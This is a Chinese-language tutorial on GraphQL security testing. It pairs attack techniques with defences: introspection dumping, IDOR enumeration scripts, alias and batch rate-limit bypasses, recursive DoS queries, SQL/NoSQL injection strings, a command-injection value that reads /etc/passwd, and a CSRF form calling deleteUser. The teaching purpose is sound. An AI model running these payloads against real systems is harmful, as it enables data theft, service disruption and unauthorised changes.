---
title: GraphQL安全测试
date: 2026-08-01 08:00:00
tags:
  - Web安全
  - 渗透测试
  - 移动安全
description: GraphQL 安全测试——Introspection 利用、IDOR via GraphQL 与批量攻击绕过。
categories: 渗透测试
---

## 引言

GraphQL 作为 REST API 的替代方案，因其灵活的数据查询能力和高效的网络传输被越来越多的企业采用。然而，这种灵活性也带来了独特的安全挑战。本文将系统梳理 GraphQL 安全测试中的常见攻击面、利用手法与防御建议，为安全从业者提供一份可操作的测试指南。

## GraphQL 基础回顾

在深入安全测试之前，先回顾 GraphQL 的三种核心操作类型。

### Query（查询）

Query 用于从服务端读取数据，类比 REST 的 GET 请求。客户端可以精确指定需要的字段，避免过度获取或获取不足的问题。

```graphql
query {
  user(id: 1) {
    name
    email
    posts {
      title
      content
    }
  }
}
```

### Mutation（变更）

Mutation 用于创建、更新或删除数据，类比 REST 的 POST/PUT/DELETE。所有修改操作必须通过 Mutation 完成。

```graphql
mutation {
  createUser(input: {name: "test", email: "test@example.com"}) {
    id
    name
  }
}
```

### Subscription（订阅）

Subscription 用于建立与服务端的实时连接，当特定事件发生时，服务端会主动向客户端推送数据，通常基于 WebSocket 实现。

```graphql
subscription {
  messageAdded(roomId: 1) {
    id
    text
    sender
  }
}
```

**安全视角：** 三种操作共享同一端点，意味着攻击者只需找到一个入口即可对所有类型的操作进行探测。订阅功能如果未做鉴权，可能导致实时数据泄露。

## 一、内省（Introspection）信息泄露

### 原理

GraphQL 内置的内省系统允许客户端查询 Schema 的完整定义，包括所有类型、字段、参数及其描述。这在开发阶段极有价值，但若暴露在生产环境中，相当于将整个 API 的"蓝图"交到攻击者手中。

### 利用手法

最常见的做法是先探测内省是否开启，然后导出完整 Schema。

**检测内省是否开启：**

```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

**导出完整 Schema 的经典内省查询：**

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
```

将上述查询的结果保存后，可以使用在线工具或本地脚本解析 Schema，快速发现敏感查询（如 `user`、`allUsers`、`logs`、`systemConfig`）和敏感字段（如 `password`、`token`、`secretKey`、`creditCard`）。

### 防御建议

- 生产环境关闭内省：大多数 GraphQL 框架支持通过配置禁用内省。
- 若无法关闭，可对内省查询添加认证和授权校验。
- 定期自查端点，确认内省不可用。

## 二、越权与 IDOR via GraphQL

### 原理

GraphQL 的嵌套查询使得传统基于 URL 路径的访问控制变得更加复杂。由于所有请求走同一个端点，权限校验必须下沉到 Resolver 层级，否则容易出现水平或垂直越权。

### 场景：通过修改查询参数实现 IDOR

假设存在查询 `user(id: ID!): User`，攻击者可通过修改 `id` 参数访问其他用户的数据。

```graphql
# 正常请求：查询 ID 为 42 的用户
query {
  user(id: 42) {
    name
    email
    phone
  }
}

# 越权请求：遍历 ID 获取所有用户数据
query {
  u1: user(id: 1) { name email phone }
  u2: user(id: 2) { name email phone }
  u3: user(id: 3) { name email phone }
}
```

**批量遍历自动化：**

```python
import requests

query_template = '''
query {
  user(id: %d) {
    id
    name
    email
    phone
  }
}
'''

for uid in range(1, 1000):
    query = query_template % uid
    r = requests.post(
        'https://target.com/graphql',
        json={'query': query},
        headers={'Authorization': 'Bearer <token>'}
    )
    if r.status_code == 200 and 'null' not in r.text:
        print(f"[+] Found user {uid}: {r.text}")
```

### 嵌套越权

GraphQL 的嵌套特性也使得通过关联关系进行越权成为可能：

```graphql
# 通过所属组织越权访问其他团队的成员
query {
  organization(id: 123) {
    name
    members {
      id
      name
      email         # 可能看到非本团队成员的信息
      personalPhone # 敏感字段
    }
  }
}
```

### 防御建议

- 在 Resolver 层实施细粒度的字段级访问控制。
- 避免依赖客户端传入的 ID 作为唯一鉴权依据，应结合当前会话的上下文进行校验。
- 使用 GraphQL Shield 或自定义指令实现声明式权限控制。

## 三、批量查询绕过速率限制

### 原理

REST API 的速率限制通常基于请求数量。但 GraphQL 的一个请求可以包含多个独立查询（Batching）或通过别名在一次查询中请求大量数据，从而轻松绕过传统的基于请求次数的速率限制。

### Query Batching

部分 GraphQL 实现支持在一个 HTTP 请求中发送多个查询操作：

```json
[
  {"query": "query { user(id: 1) { email } }"},
  {"query": "query { user(id: 2) { email } }"},
  {"query": "query { user(id: 3) { email } }"},
  ...
  {"query": "query { user(id: 100) { email } }"}
]
```

如果服务端接受数组形式的请求体，攻击者可以在单个 HTTP 请求中打包数百个查询，而速率限制器只计为一次请求。

### 别名轰炸（Alias-based Batching）

即使不启用 Batching，也可通过别名在一次查询中实现类似效果：

```graphql
query {
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  a3: user(id: 3) { email }
  a4: user(id: 4) { email }
  a5: user(id: 5) { email }
  # ... 可继续叠加至数千个别名
}
```

**自动化生成别名的脚本片段：**

```python
def generate_alias_query(field, ids, subfields):
    """生成别名轰炸查询"""
    aliases = []
    for i, uid in enumerate(ids):
        aliases.append(f"  a{i}: {field}(id: {uid}) {{ {' '.join(subfields)} }}")
    return "query {\n" + "\n".join(aliases) + "\n}"
```

### 防御建议

- 实施查询成本分析（Query Cost Analysis）：为每个字段分配成本权重，限制单次查询的总成本。
- 限制单次查询中允许的别名数量上限。
- 禁用 Query Batching 功能或将其纳入速率限制计算。
- 结合令牌桶或滑动窗口算法，按实际解析的字段数量而非请求次数进行限速。

## 四、深度递归 DoS 攻击

### 原理

GraphQL 的嵌套查询语法使得攻击者可以构造极深的递归查询，导致服务端在解析和执行时消耗大量 CPU 和内存资源，造成拒绝服务。

### 攻击载荷示例

```graphql
query DeepDoSAttack {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author {
                    posts {
                      author {
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

更隐蔽的方式是利用循环引用关系构造"无限深度"查询：

```graphql
# 如果 User -> Post -> User 形成循环
query CyclicDoS {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author {
                    posts {
                      author {
                        # ... 可持续嵌套
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### 防御建议

- 设置最大查询深度（Max Query Depth），通常建议限制在 7-10 层。
- 设置查询超时时间，超时后强制终止解析。
- 实施查询复杂度限制，为每个字段分配复杂度分数，对总复杂度超过阈值的请求直接拒绝。
- 使用持久化查询（Persisted Queries），只允许预先注册的查询结构执行。

## 五、参数注入与字段建议攻击

### 原理

GraphQL 查询中的参数是攻击者注入恶意数据的重要入口。如果 Resolver 在底层数据库查询或系统命令中直接拼接参数，就可能导致注入漏洞。

### SQL / NoSQL 注入

```graphql
# 假设底层查询为: SELECT * FROM users WHERE name = '{input}'
query {
  users(name: "admin' OR '1'='1") {
    id
    name
  }
}
```

```graphql
# NoSQL 注入示例（针对 MongoDB 后端）
query {
  users(filter: "{\"$gt\": \"\"}") {
    id
    name
    email
  }
}
```

### OS 命令注入

如果字段参数被传入系统命令：

```graphql
query {
  report(filename: "report1; cat /etc/passwd") {
    content
  }
}
```

### 字段建议（Field Suggestions）信息泄露

GraphQL 引擎在遇到拼写错误的字段时，可能返回建议信息，从而泄露 Schema 中存在的字段名称：

```bash
$ curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { user(id: 1) { passwor } }"}'

{
  "errors": [
    {
      "message": "Cannot query field \"passwor\" on type \"User\".
                  Did you mean \"password\"?",
      ...
    }
  ]
}
```

攻击者可利用此特性进行字段名枚举，逐步拼凑出完整的数据结构。

### 防御建议

- 所有用户输入的参数在使用前必须进行严格的类型校验与参数化处理。
- 使用 ORM 或参数化查询，杜绝字符串拼接。
- 生产环境关闭字段建议功能。
- 对敏感字段名进行混淆或在 Schema 层面进行隐藏。

## 六、GraphQL CSRF 与 CORS 配置不当

### CSRF 攻击

GraphQL 端点通常接受 `application/json` 的 POST 请求，这使得传统的表单 CSRF 较难实施。但如果端点也接受 `application/x-www-form-urlencoded` 或 GET 请求，CSRF 攻击就变得可行。

```html
<!-- 若端点接受 application/x-www-form-urlencoded -->
<form action="https://target.com/graphql" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="query"
         value="mutation { deleteUser(id: 1) { id } }">
  <input type="submit" value="Click Me">
</form>
```

**检测端点内容类型支持：**

```bash
# 测试 GET 请求
curl "https://target.com/graphql?query=query+%7B+__typename+%7D"

# 测试 form-urlencoded
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=query+%7B+__typename+%7D"

# 测试 multipart （部分实现在文件上传时启用）
curl -X POST https://target.com/graphql \
  -F "operations={\"query\":\"mutation { uploadFile(file: null) { id } }\",\"variables\":{\"file\":null}}"
```

### CORS 配置不当

若 GraphQL 端点的 CORS 配置信任任意 Origin 且允许携带凭证，攻击者可从恶意页面跨域发起认证请求。

### 防御建议

- 仅接受 `application/json` 类型的 POST 请求。
- 严格配置 CORS 白名单，禁止 `Access-Control-Allow-Origin: *` 与 `Access-Control-Allow-Credentials: true` 同时出现。
- 实施 CSRF Token 或自定义 Header 校验。

## 七、安全测试工具

### GraphQL Voyager

[GraphQL Voyager](https://github.com/APIs-guru/graphql-voyager) 将内省结果可视化为交互式关系图。安全测试者可以直观地识别复杂的数据关系、循环引用和潜在的敏感字段路径。

**使用方式：**

1. 将内省查询结果导出为 `schema.json`。
2. 在 [graphql-voyager.com](https://graphql-kit.com/graphql-voyager/) 上传文件，即可生成可视化图谱。
3. 重点关注标红的循环引用链路，这些往往也是深度 DoS 攻击的切入点。

### InQL (Burp Suite)

[InQL](https://github.com/doyensec/inql) 是 Burp Suite 的扩展插件，专门用于 GraphQL 安全测试。

**核心功能：**

- **自动内省检测与 Schema 提取：** 在 Burp 的被动扫描过程中自动识别 GraphQL 端点并尝试提取 Schema。
- **查询生成器：** 基于获取的 Schema 自动生成标准查询、Mutation 和 Subscription，节省手动编写的时间。
- **循环引用检测：** 自动标记 Schema 中存在循环引用的类型关系，辅助查找 DoS 攻击目标。
- **搜索功能：** 在 Schema 中快速搜索特定关键字（如 `password`、`token`、`secret`、`admin`）。

**使用流程：**

```bash
# 1. Burp Suite -> Extender -> Add -> 加载 InQL Scanner
# 2. 在目标站点浏览或发送请求到 /graphql 端点
# 3. InQL 自动检测并提取 Schema
# 4. 右键 -> InQL -> Generate Queries
# 5. 使用生成的查询模板进行安全测试
```

### 其他辅助工具

| 工具 | 用途 |
|------|------|
| **Clairvoyance** | 在内省关闭时通过字段建议功能恢复 Schema |
| **GraphQL Cop** | 自动化 GraphQL 安全审计脚本 |
| **GraphQL Raider** | 浏览器开发者工具中的 GraphQL 测试面板 |
| **BatchQL** | 轻量级 GraphQL 安全审计工具，支持检测 DoS 和 IDOR |
| **CrackQL** | 自动化 GraphQL 密码暴力破解工具 |

## 八、综合测试 Checklist

在对 GraphQL 端点进行安全测试时，建议按以下清单逐项排查：

- [ ] **端点发现：** 确认 `/graphql`、`/gql`、`/api/graphql`、`/v1/graphql` 等常见路径。
- [ ] **内省探测：** 尝试 `__schema`、`__type` 查询，确认内省是否开启。
- [ ] **Schema 导出：** 导出完整 Schema，识别敏感类型、字段和 Mutation。
- [ ] **字段建议：** 发送错误字段名，观察是否有"Did you mean"类型的泄露。
- [ ] **IDOR 测试：** 遍历 ID 参数，测试水平越权；尝试嵌套查询绕过权限校验。
- [ ] **别名轰炸：** 在同一次查询中构造大量别名，测试速率限制是否有效。
- [ ] **Query Batching：** 尝试发送数组格式的批量查询，绕过速率限制。
- [ ] **深度递归：** 构造循环嵌套查询，测试最大深度限制和超时保护。
- [ ] **注入测试：** 向字符串参数注入 SQL/NoSQL/OS 命令 Payload，观察响应。
- [ ] **CSRF 测试：** 测试端点是否接受 GET、form-urlencoded 或 multipart 请求格式。
- [ ] **CORS 检查：** 使用恶意 Origin 头跨域请求，确认 CORS 配置安全。
- [ ] **Subscription 鉴权：** 尝试未认证连接 WebSocket，测试订阅的消息是否会泄露。
- [ ] **文件上传：** 若存在文件上传 Mutation，测试类型限制、大小限制和任意文件覆盖。
- [ ] **错误信息泄露：** 触发错误后检查响应中是否包含堆栈跟踪（Stack Trace）、数据库查询细节或调试信息。

## 总结

GraphQL 的安全性高度依赖于服务端在每个 Resolver 层的实现细节。传统面向 REST 的安全策略（如基于 URL 的速率限制、全局中间件鉴权）在 GraphQL 场景下往往存在盲区。安全测试者需要深入理解图查询的工作方式，结合专用的测试工具，才能系统性地覆盖 GraphQL 特有的攻击面。

对于开发与运维团队，建议将"安全左移"——在 GraphQL Schema 设计阶段就引入权限模型和查询成本约束，而非在生产环境暴露后才进行补救。

---

> **免责声明：** 本文所述技术仅供安全研究与授权测试使用。未经授权对目标系统进行安全测试和攻击属于违法行为。读者在实际操作中应遵守《中华人民共和国网络安全法》《中华人民共和国数据安全法》等相关法律法规，在获得明确书面授权的前提下开展工作。作者不对因滥用文中技术导致的任何法律责任或损失承担责任。
